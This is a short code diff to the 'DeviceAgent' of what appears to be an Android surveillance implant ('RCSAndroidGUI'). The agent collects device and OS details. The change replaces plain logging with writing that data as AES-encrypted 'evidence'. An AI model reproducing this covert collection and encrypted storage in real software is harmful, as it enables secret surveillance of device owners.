@@ -18,8 +18,10 @@ import java.util.Properties;
 import java.util.Map.Entry;
 
 import com.ht.RCSAndroidGUI.Device;
+import com.ht.RCSAndroidGUI.Evidence;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.RCSAndroidGUI;
+import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.event.Event;
 import com.ht.RCSAndroidGUI.event.EventBase;
 import com.ht.RCSAndroidGUI.utils.Utils;
@@ -51,11 +53,10 @@ public class DeviceAgent extends AgentBase {
 	}
 	
 	public void begin() {
-		setPeriod(2000);
+		setPeriod(NEVER);
 	}
 	
 	public void go() {
-		LogR log = new LogR(Agent.AGENT_DEVICE, LogR.LOG_PRI_STD);
 		
 		// OS Version etc...
 		Log.d("RCS", "Android");
@@ -89,9 +90,15 @@ public class DeviceAgent extends AgentBase {
 		}
 		
 		String content = sb.toString();
-		log.write(WChar.getBytes(content, true));
 		
-		log.close();
+		//LogR log = new LogR(Agent.AGENT_DEVICE, LogR.LOG_PRI_STD);
+		//log.write(WChar.getBytes(content, true));
+		//log.close();
+		
+		Evidence evidence = new Evidence(Agent.AGENT_DEVICE, Keys.self().getAesKey());
+		evidence.atomicWriteOnce(WChar.getBytes(content, true));
+		
+		
 	}
 	
 
